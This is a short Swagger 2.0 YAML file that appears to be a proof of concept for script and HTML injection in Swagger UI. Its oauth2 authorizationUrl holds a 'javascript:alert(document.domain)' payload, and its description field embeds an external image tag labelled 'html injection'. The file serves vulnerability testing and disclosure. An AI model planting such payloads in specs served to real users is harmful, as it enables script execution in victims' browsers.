swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "0.0.1"
  title: Example Title
  description: html injection <img src=https://n00bsecurityblog.files.wordpress.com/2017/09/url_1.png?w=695&h=450 />
paths:
  /:
    get:
      responses:
        200:
          description: Successful respons
